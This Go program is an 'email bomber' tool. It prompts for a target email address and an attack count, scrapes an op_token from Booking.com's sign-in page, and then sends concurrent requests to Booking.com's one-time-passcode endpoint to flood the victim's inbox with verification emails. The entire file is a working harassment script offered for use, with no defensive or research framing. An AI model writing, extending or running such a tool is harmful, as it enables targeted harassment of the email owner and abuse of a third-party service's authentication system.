package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// --- Structs ---
// AttackVector defines a full attack flow for one site.
type AttackVector struct {
	Name       string
	// Setup is now optional. For sites like Booking.com, we use this.
	SetupFunc  func(client *http.Client) (interface{}, error) 
	AttackFunc func(wg *sync.WaitGroup, client *http.Client, email string, setupData interface{})
}

// BookingData holds the data scraped from the booking.com sign-in page.
type BookingData struct {
	OpToken string
}

// --- Helper: Interactive Prompt ---
func promptForInput(reader *bufio.Reader, prompt string) string {
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// --- Booking.com Specific Functions ---

// setupBooking scrapes the op_token from the sign-in page using only http.Client.
func setupBooking(client *http.Client) (interface{}, error) {
	log.Println("[Booking.com Setup] Fetching sign-in page to get op_token...")
	
	req, err := http.NewRequest("GET", "https://account.booking.com/sign-in", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	html := string(body)

	re := regexp.MustCompile(`name="op_token"\s+value="([^"]+)"`)
	matches := re.FindStringSubmatch(html)

	if len(matches) < 2 {
		return nil, fmt.Errorf("could not find op_token on the page")
	}

	opToken := matches[1]
	log.Printf("[Booking.com Setup] Successfully extracted op_token.")

	return &BookingData{OpToken: opToken}, nil
}

// attackBooking sends the final POST request to trigger the OTP email.
func attackBooking(wg *sync.WaitGroup, client *http.Client, email string, setupData interface{}) {
	defer wg.Done()

	data, ok := setupData.(*BookingData)
	if !ok || data.OpToken == "" {
		log.Println("[Booking.com Attack FAILURE] Invalid or missing op_token.")
		return
	}

	log.Println("[Booking.com Attack] Sending HTTP request to trigger email...")

	targetURL := fmt.Sprintf("https://account.booking.com/api/identity/authenticate/v1.0/otp/email/submit?op_token=%s", data.OpToken)
	
	payload := map[string]interface{}{
		"identifier": map[string]string{
			"type":  "IDENTIFIER_TYPE__EMAIL",
			"value": email,
		},
		"context": map[string]interface{}{},
	}
	
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[Booking.com Attack FAILURE] Could not create JSON payload: %v", err)
		return
	}

	req, _ := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonPayload))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil { log.Printf("[Booking.com Attack FAILURE] Request failed: %v", err); return }
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Printf("[Booking.com Attack SUCCESS] Request sent successfully. Status: %d", resp.StatusCode)
	} else {
		log.Printf("[Booking.com Attack FAILURE] Request failed with status. Status: %d", resp.StatusCode)
	}
}


// --- Main Function ---
func main() {
	rand.Seed(time.Now().UnixNano())
	log.Println("--- Termux-Compatible Bomber ---")
	reader := bufio.NewReader(os.Stdin)
	targetEmail := promptForInput(reader, "Enter the target email address: ")
	attacksPerSiteStr := promptForInput(reader, "Enter the number of attacks PER SITE: ")
	attacksPerSite, err := strconv.Atoi(attacksPerSiteStr)
	if err != nil || attacksPerSite <= 0 { log.Fatal("Error: Invalid number of attacks.") }

	// --- Define All Attack Vectors Here ---
	attackVectors := []AttackVector{
		{Name: "Booking.com", SetupFunc: setupBooking, AttackFunc: attackBooking},
	}
	
	log.Printf("Target Email: %s | Attacks Per Site: %d", targetEmail, attacksPerSite)
	log.Println("--- Starting Setup Phase ---")
	
	jar, _ := cookiejar.New(nil)
	client := &http.Client{Jar: jar, Timeout: 30 * time.Second}

	var successfulSetups = make(map[string]interface{})
	for _, vector := range attackVectors {
		if vector.SetupFunc != nil {
			log.Printf("Starting setup for: %s", vector.Name)
			data, err := vector.SetupFunc(client)
			if err != nil {
				log.Printf("[ERROR] Setup for %s failed: %v", vector.Name, err)
				continue // Skip this vector if setup fails
			}
			successfulSetups[vector.Name] = data
			log.Printf("Setup for %s finished successfully.", vector.Name)
		}
	}
	log.Println("--- Setup Finished ---")


	log.Println("--- Starting Attack Phase ---")
	var attackWg sync.WaitGroup
	
	for _, vector := range attackVectors {
		setupData, ok := successfulSetups[vector.Name]
		if !ok && vector.SetupFunc != nil {
			log.Printf("Skipping attacks for %s because its setup failed.", vector.Name)
			continue
		}
		
		for i := 0; i < attacksPerSite; i++ {
			attackWg.Add(1)
			go vector.AttackFunc(&attackWg, client, targetEmail, setupData)
			time.Sleep(100 * time.Millisecond)
		}
	}

	attackWg.Wait()
	log.Println("--- Operation Finished ---")
}
